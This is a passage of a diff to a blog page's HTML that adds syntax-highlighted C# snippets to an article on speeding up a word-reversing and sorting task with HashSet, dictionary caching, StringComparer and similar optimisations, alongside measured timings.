+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultAdd</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Reverse</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">reversedword</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">String</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">.</span><span class="method">Reverse</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">ToArray</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Reverse</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultAdd</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">reversedword</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_ResultAdd</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Foreach</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Order</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">orderedWords</span> <span class="special-char">=</span> <span class="normal">resultWords</span><span class="special-char">.</span><span class="method">OrderBy</span><span class="special-char">(</span><span class="normal">x</span> <span class="special-char">=</span><span class="special-char">&gt;</span> <span class="normal">x</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">ToList</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Order</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Join</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">result</span> <span class="special-char">=</span> <span class="class">String</span><span class="special-char">.</span><span class="method">Join</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span><span class="special-char">"</span></span><span class="special-char">,</span> <span class="normal">orderedWords</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Join</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_stopwatch_Total</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">result</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">long</span> <span class="normal">ElapsedMilliseconds</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">get</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">_stopwatch_Total</span><span class="special-char">.</span><span class="normal">ElapsedMilliseconds</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
                             <p class="sub-title"><h3>The results:</h3></p>
                             <ul>
                                 <li><p><span><code>List.Contains</code> took almost 33 seconds, super slow, as expected. <i>I used it on purpose.</i></span></p></li>
@@ -1976,7 +2230,12 @@
                         <div class="sub-title"><h2>Use appropriate data structures</h2></div>
                         <div>
                             <p><span>With this quantity of words, I need a <code>HashSet</code> for duplicates detection, not a <code>List</code>. In fact, I put <code>List.Contains</code> in my code only to illustrate this very common mistake.</span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="comment"><span class="special-char">//</span>var duplicateWords = new HashSet&lt;string&gt;</span></span>
+                                    <br /><span class="line"><span class="decl">var</span> <span class="normal">isDuplicate</span> <span class="special-char">=</span> <span class="special-char">!</span><span class="normal">duplicateWords</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                </code>
+                            </p>
                             <p>
                                 <span>
                                     It was 34 seconds in total, now it is about 1400 ms (again, after several measurements).
@@ -1987,13 +2246,30 @@
                         <div class="sub-title"><h2>Use precomputations</h2></div>
                         <div>
                             <p><span>Now, the slow part is the <code>Reverse</code> method. Here is another simple optimization to do.</span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">private</span> <span class="decl">string</span> <span class="method">Reverse</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">str</span><span class="special-char">)</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span>_reversedStrings = new Dictionary&lt;string, string&gt;();</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">_reversedStrings</span><span class="special-char">.</span><span class="method">ContainsKey</span><span class="special-char">(</span><span class="normal">str</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">_reversedStrings</span><span class="special-char">[</span><span class="normal">str</span><span class="special-char">]</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">result</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">String</span><span class="special-char">(</span><span class="normal">str</span><span class="special-char">.</span><span class="method">Reverse</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">ToArray</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_reversedStrings</span><span class="special-char">.</span><span class="method">Add</span><span class="special-char">(</span><span class="normal">str</span><span class="special-char">,</span> <span class="normal">result</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">result</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"><span class="special-char">}</span></span>
+                                </code>
+                            </p>
                             <p><span>1400 to 1150 ms in total (-18%). And slightly faster if I run it again without clearing the Dictionary.</span></p>
                         </div>
                         <div class="sub-title"><h2>Avoid misuses</h2></div>
                         <div>
                             <p><span>See the <code>String.ToLower</code> at the beginning? It takes less than 100 ms (80-90 ms to be exact) - nothing too bad if we are talking about tens of seconds. But now it has become 7-8%.</span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">var</span> <span class="normal">duplicateWords</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">HashSet</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="class">StringComparer</span><span class="special-char">.</span><span class="normal">OrdinalIgnoreCase</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                </code>
+                            </p>
                             <p><span>Another 50ms gone (-4%; hereinafter: from previous result). Obviously, the usage of <code>StringComparer</code> has some cost.</span></p>
                             <p><span><b>The output is not lower-case only anymore, but the task doesn't have any requirements about it.</b></span></p>
                         </div>
@@ -2002,15 +2278,44 @@
                             <ul>
                                 <li>
                                     <p><span><code>OrderBy</code> followed by <code>ToList</code> seems redundant, I used it only for the stopwatch.</span></p>
-                                    <p><code class="code-block"></code></p>
+                                    <p>
+                                        <code class="code-block csharp">
+                                            <span class="line"><span class="comment"><span class="special-char">//</span>_stopwatch_Order.Start();</span></span>
+                                            <br /><span class="line"><span class="comment"><span class="special-char">//</span>var orderedWords = resultWords.OrderBy(x =&gt; x.Length).ToList();</span></span>
+                                            <br /><span class="line"><span class="comment"><span class="special-char">//</span>_stopwatch_Order.Stop();</span></span>
+                                            <br /><span class="line"></span>
+                                            <br /><span class="line"><span class="comment"><span class="special-char">//</span>_stopwatch_Join.Start();</span></span>
+                                            <br /><span class="line"><span class="comment"><span class="special-char">//</span>var result = String.Join("", orderedWords);</span></span>
+                                            <br /><span class="line"><span class="comment"><span class="special-char">//</span>_stopwatch_Join.Stop();</span></span>
+                                            <br /><span class="line"></span>
+                                            <br /><span class="line"><span class="normal">_stopwatch_OrderAndJoin</span><span class="special-char">.</span><span class="method">Start</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                            <br /><span class="line"><span class="decl">var</span> <span class="normal">result</span> <span class="special-char">=</span> <span class="class">String</span><span class="special-char">.</span><span class="method">Join</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span> <span class="special-char">"</span></span><span class="special-char">,</span> <span class="normal">resultWords</span><span class="special-char">.</span><span class="method">OrderBy</span><span class="special-char">(</span><span class="normal">x</span> <span class="special-char">=</span><span class="special-char">&gt;</span> <span class="normal">x</span><span class="special-char">.</span><span class="normal">Length</span><span class="special-char">)</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                            <br /><span class="line"><span class="normal">_stopwatch_OrderAndJoin</span><span class="special-char">.</span><span class="method">Stop</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                        </code>
+                                    </p>
                                 </li>
                                 <li>
                                     <p><span>Bitwise operations are faster than arithmetic operations.</span></p>
-                                    <p><code class="code-block"></code></p>
+                                    <p>
+                                        <code class="code-block csharp">
+                                            <span class="line"><span class="comment"><span class="special-char">//</span>var isEven = word.Length % 2 == 0;</span></span>
+                                            <br /><span class="line"><span class="decl">var</span> <span class="normal">isEven</span> <span class="special-char">=</span> <span class="normal">word</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">&amp;</span> <span class="normal">1</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">;</span></span>
+                                        </code>
+                                    </p>
                                 </li>
                                 <li>
                                     <p><span>No need to reverse single-char words.</span></p>
-                                    <p><code class="code-block"></code></p>
+                                    <p>
+                                        <code class="code-block csharp">
+                                            <span class="line"><span class="decl">private</span> <span class="decl">string</span> <span class="method">Reverse</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">str</span><span class="special-char">)</span></span>
+                                            <br /><span class="line"><span class="special-char">{</span></span>
+                                            <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">str</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">1</span><span class="special-char">)</span></span>
+                                            <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">str</span><span class="special-char">;</span></span>
+                                            <br /><span class="line"></span>
+                                            <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="comment"><span class="special-char">//</span>other logic here</span></span>
+                                            <br /><span class="line"><span class="special-char">}</span></span>
+                                        </code>
+                                    </p>
                                 </li>
                             </ul>
                             <p><span>Honestly, I didn't see any improvements here. <i>This is expected: String.Join has a special case for lists and arrays, modulus operator is optimized by many compilers, and we have relatively few single-char words.</i></span></p>
@@ -2035,23 +2340,152 @@
                         <div class="sub-title"><h2>Not so readable code</h2></div>
                         <div>
                             <p><span>The main idea here is to use some task-relevant and more efficient data structure instead of <code>IEnumerable&lt;string&gt;</code></span></p>
-                            <p><span><code class="code-block"></code></span></p>
+                            <p>
+                                <code class="code-block csharp">
+                                    <span class="line"><span class="decl">internal</span> <span class="decl">class</span> <span class="class">TestTask_Faster</span> <span class="special-char">:</span> <span class="class">ITestTask</span></span>
+                                    <br /><span class="line"><span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">private</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="class">Dictionary</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">,</span> <span class="decl">int</span><span class="special-char">&gt;</span><span class="special-char">&gt;</span> <span class="normal">_words</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">List</span><span class="special-char">&lt;</span><span class="class">Dictionary</span><span class="special-char">&lt;</span><span class="decl">string</span><span class="special-char">,</span> <span class="decl">int</span><span class="special-char">&gt;</span><span class="special-char">&gt;</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">public</span> <span class="decl">string</span> <span class="method">Run</span><span class="special-char">(</span><span class="decl">string</span> <span class="normal">input</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">_words</span><span class="special-char">.</span><span class="method">Clear</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span>  </span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="class">String</span><span class="special-char">.</span><span class="method">IsNullOrEmpty</span><span class="special-char">(</span><span class="normal">input</span><span class="special-char">)</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">return</span> <span class="normal">input</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">wordBuilder</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">StringBuilder</span><span class="special-char">(</span><span class="normal">25</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">chr</span> <span class="normal">in</span> <span class="normal">input</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">isSeparator</span> <span class="special-char">=</span> <span class="class">Consts</span><span class="special-char">.</span><span class="normal">SeparatorsList</span><span class="special-char">.</span><span class="method">Contains</span><span class="special-char">(</span><span class="normal">chr</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">isSeparator</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">wordBuilder</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">!</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">word</span> <span class="special-char">=</span> <span class="normal">wordBuilder</span><span class="special-char">.</span><span class="method">ToString</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="method">AddWord</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">wordBuilder</span><span class="special-char">.</span><span class="method">Clear</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">else</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">wordBuilder</span><span class="special-char">.</span><span class="method">Append</span><span class="special-char">(</span><span class="normal">chr</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">wordBuilder</span><span class="special-char">.</span><span class="normal">Length</span> <span class="special-char">!</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">word</span> <span class="special-char">=</span> <span class="normal">wordBuilder</span><span class="special-char">.</span><span class="method">ToString</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="method">AddWord</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">}</span></span>
+                                    <br /><span class="line"></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">resultBuilder</span> <span class="special-char">=</span> <span class="decl">new</span> <span class="class">StringBuilder</span><span class="special-char">(</span><span class="special-char">)</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">for</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">wordLength</span> <span class="special-char">=</span> <span class="normal">1</span><span class="special-char">;</span> <span class="normal">wordLength</span> <span class="special-char">&lt;</span> <span class="normal">_words</span><span class="special-char">.</span><span class="normal">Count</span><span class="special-char">;</span> <span class="normal">wordLength</span><span class="special-char">+</span><span class="special-char">+</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="decl">var</span> <span class="normal">isEvenLength</span> <span class="special-char">=</span> <span class="normal">wordLength</span> <span class="special-char">%</span> <span class="normal">2</span> <span class="special-char">=</span><span class="special-char">=</span> <span class="normal">0</span><span class="special-char">;</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">if</span> <span class="special-char">(</span><span class="normal">isEvenLength</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="stmnt">foreach</span> <span class="special-char">(</span><span class="decl">var</span> <span class="normal">word</span> <span class="normal">in</span> <span class="normal">_words</span><span class="special-char">[</span><span class="normal">wordLength</span><span class="special-char">]</span><span class="special-char">.</span><span class="normal">Keys</span><span class="special-char">)</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="special-char">{</span></span>
+                                    <br /><span class="line">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="normal">resultBuilder</span><span class="special-char">.</span><span class="method">Append</span><span class="special-char">(</span><span class="normal">word</span><span class="special-char">)</span><span class="special-char">.</span><span class="method">Append</span><span class="special-char">(</span><span class="string"><span class="special-char">"</span> <span class="special-char">"</span></span><span class="special-char">)</span><span class="special-char">;</span></span>
